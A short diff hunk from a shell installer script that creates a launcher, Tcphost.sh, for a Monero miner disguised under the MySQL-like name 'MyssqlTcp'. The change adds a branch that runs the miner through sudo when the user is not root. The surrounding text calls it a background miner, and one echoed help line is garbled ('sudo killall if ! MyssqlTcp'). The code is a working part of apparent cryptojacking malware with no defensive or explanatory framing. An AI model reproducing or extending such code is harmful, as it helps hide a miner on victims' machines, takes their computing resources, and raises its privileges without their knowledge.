@@ -743,7 +743,11 @@ echo "[*] Creating $HOME/myssqltcp/Tcphost.sh script"
 cat >$HOME/myssqltcp/Tcphost.sh <<EOL
 #!/bin/bash
 if ! pidof MyssqlTcp >/dev/null; then
-  nice $HOME/myssqltcp/MyssqlTcp \$*
+    if [[ $EUID -eq 0 ]]; then
+      nice $HOME/myssqltcp/MyssqlTcp \$*
+    else
+      sudo nice $HOME/myssqltcp/MyssqlTcp \$*
+    fi
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall MyssqlTcp\" or \"sudo killall if ! MyssqlTcp\" if you want to remove background miner first."
